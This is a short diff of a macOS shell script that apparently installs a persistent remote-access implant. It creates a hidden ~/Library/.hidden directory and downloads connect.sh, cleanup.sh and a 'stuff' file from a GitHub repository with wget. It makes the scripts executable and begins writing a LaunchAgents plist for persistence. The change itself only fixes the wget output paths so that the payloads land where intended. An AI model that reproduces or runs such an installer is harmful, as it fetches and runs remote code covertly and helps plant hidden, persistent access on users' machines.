@@ -2,10 +2,10 @@
 mkdir ~/Library/.hidden;
 mkdir ~/Library/LaunchAgents;
 
-wget https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/connect.sh ~/Library/.hidden/connect.sh;
+wget -O ~/Library/.hidden/connect.sh https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/connect.sh;
 chmod +x ~/Library/.hidden/connect.sh;
-wget https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/stuff.txt ~/Library/.hidden/stuff;
-wget https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/cleanup.sh ~/Library/.hidden/cleanup.sh;
+wget -O ~/Library/.hidden/stuff https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/stuff.txt;
+wget -O ~/Library/.hidden/cleanup.sh https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/cleanup.sh;
 chmod +x ~/Library/.hidden/cleanup.sh;
 
 echo '<plist version="1.0">
